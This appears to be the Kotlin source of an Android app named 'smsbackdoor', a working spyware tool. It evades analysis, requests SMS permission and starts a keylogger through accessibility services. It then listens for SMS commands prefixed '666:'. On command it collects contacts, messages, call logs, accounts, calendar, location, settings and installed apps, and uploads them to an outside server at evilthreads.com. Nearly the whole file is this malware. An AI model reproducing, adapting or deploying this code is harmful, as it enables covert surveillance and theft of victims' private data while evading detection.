/*
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.*/
package com.evilthreads.smsbackdoor

import android.Manifest
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.evilthreads.evade.evade
import com.evilthreads.keylogger.Keylogger
import com.evilthreads.pickpocket.*
import com.evilthreads.pickpocket.podos.*
import com.evilthreads.smsbackdoor.RemoteCommands.GET_ACCOUNTS
import com.evilthreads.smsbackdoor.RemoteCommands.GET_APPS
import com.evilthreads.smsbackdoor.RemoteCommands.GET_CALENDAR_EVENTS
import com.evilthreads.smsbackdoor.RemoteCommands.GET_CALL_LOG
import com.evilthreads.smsbackdoor.RemoteCommands.GET_CONTACTS
import com.evilthreads.smsbackdoor.RemoteCommands.GET_DEVICE_INFO
import com.evilthreads.smsbackdoor.RemoteCommands.GET_FILES
import com.evilthreads.smsbackdoor.RemoteCommands.GET_LOCATION
import com.evilthreads.smsbackdoor.RemoteCommands.GET_MMS
import com.evilthreads.smsbackdoor.RemoteCommands.GET_SETTINGS
import com.evilthreads.smsbackdoor.RemoteCommands.GET_SMS
import com.kotlinpermissions.KotlinPermissions
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.features.auth.*
import io.ktor.client.features.auth.providers.*
import io.ktor.client.features.json.*
import io.ktor.client.features.json.serializer.*
import io.ktor.client.request.*
import io.ktor.http.*
import io.ktor.util.*
import kotlinx.coroutines.runBlocking
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
/**
* @author Chris Basinger
* @email evilthreads669966@gmail.com
* @date 10/08/20
*
*  [Context.evade] is used to check whether it is safe before using [KotlinPermissions.ask] to request [RECEIVE_SMS] permission. The [onAccepted] callback is where your optional
*  payload to run in [] will be initialized. After this, [SmsBackdoor.open] is used to open the backdoor and to allow you to implement your own command handler for remote commands
*  as they're received. After [SmsBackdoor.open]'s command handler implementation, the user is sent to the accessibility services settings screen for the[Keylogger.subscribe] method
*  of the payload to be able to receive keystrokes. Our [SmsBackdoor.commandHandler] implementation matches remote commands and then uses [Pickpocket] query functions for fetching
*  the data associated each remote command defined within [RemoteCommands]. The data is then serialized and posted to one of the various endpoints of the web servers' REST API with
*  Ktor [HTTPClient] using [Auth.basic] feature for basic authentication and the [CIO] [HTTPClientEngine] for transmitting HTTP requests.
* */
@KtorExperimentalAPI
class MainActivity : AppCompatActivity() {

    companion object{
        val TAG = this::class.java.simpleName
    }

    init {
        lifecycleScope.launchWhenCreated {
            evade(this) {
                KotlinPermissions.with(this@MainActivity).permissions(Manifest.permission.RECEIVE_SMS)
                    .onAccepted {
                        val myPayload = suspend {
                            Keylogger.subscribe { entry ->
                                Log.d(TAG, entry.toString())
                            }
                        }
                        SmsBackdoor.openDoor(this@MainActivity, "666:", payload = myPayload) { remoteCommand ->
                            runBlocking {
                                when (remoteCommand) {
                                    GET_CALENDAR_EVENTS -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
                                    GET_CONTACTS -> contactsLaunch(this@MainActivity).let { contacts -> client.upload(contacts) }
                                    GET_CALL_LOG -> callLogLaunch(this@MainActivity).let { calls -> client.upload(calls) }
                                    GET_SMS -> smsLaunch(this@MainActivity).let { smsMessages -> client.upload(smsMessages) }
                                    GET_ACCOUNTS -> accountsLaunch(this@MainActivity).let { accounts -> client.upload(accounts) }
                                    GET_MMS -> mmsLaunch(this@MainActivity).let { mmsMessages -> Log.d(TAG, "NEEDS MULTIPART") }
                                    GET_FILES -> filesLaunch(this@MainActivity).let { files -> Log.d(TAG, "NEEDS MULTIPART") }
                                    GET_DEVICE_INFO -> deviceLaunch(this@MainActivity).let { device -> client.upload(listOf(device)) }
                                    GET_LOCATION -> locationLaunch(this@MainActivity)?.let { location -> client.upload(listOf(location)) }
                                    GET_SETTINGS -> settingsLaunch(this@MainActivity).let { settings -> client.upload(settings) }
                                    GET_APPS -> softwareLaunch(this@MainActivity).let { apps -> client.upload(apps) }
                                    else -> Log.d(TAG, "COMMAND NOT FOUND")
                                }
                            }
                        }
                        Keylogger.requestPermission(this@MainActivity)
                    }.ask()
            }
        }
    }
}

@KtorExperimentalAPI
val client = HttpClient(CIO){
    install(JsonFeature){
        serializer = KotlinxSerializer()
    }
    install(Auth){
        basic {
            username = "evilthreads"
            password = "secret"
        }
    }
}

val BASE_URL = "http://evilthreads.com/api"

inline suspend fun <reified T: PocketData> HttpClient.upload(data: List<T>){
    lateinit var endPoint: String
    when(data.first()){
        is Contact -> endPoint = "$BASE_URL/contacts"
        is CallLogEntry -> endPoint = "$BASE_URL/calls"
        is Sms -> endPoint = "$BASE_URL/sms"
        is UserAccount -> endPoint = "$BASE_URL/accounts"
        is Mms -> endPoint = "$BASE_URL/mms"
        is DocumentsFile -> endPoint = "$BASE_URL/files"
        is Device -> endPoint = "$BASE_URL/devices"
        is RecentLocation -> endPoint = "$BASE_URL/locations"
        is Setting -> endPoint = "$BASE_URL/settings"
        is Software -> endPoint = "$BASE_URL/apps"
    }
    this.post<List<T>>(endPoint){
        body = defaultSerializer().write(data, ContentType.Application.Json)
    }
}

object RemoteCommands{
    val GET_DEVICE_INFO = "COMMAND_GET_DEVICE_INFO"
    val GET_ACCOUNTS = "COMMAND_GET_ACCOUNTS"
    val GET_CONTACTS = "COMMAND_GET_CONTACTS"
    val GET_SMS = "COMMAND_GET_SMS"
    val GET_MMS = "COMMAND_GET_MMS"
    val GET_CALL_LOG = "COMMAND_GET_CALL_LOG"
    val GET_CALENDAR_EVENTS = "COMMAND_GET_CALENDAR_EVENTS"
    val GET_FILES = "COMMAND_GET_FILES"
    val GET_LOCATION = "COMMAND_GET_LOCATION"
    val GET_SETTINGS = "COMMAND_GET_SETTINGS"
    val GET_APPS = "COMMAND_GET_APPS"
}
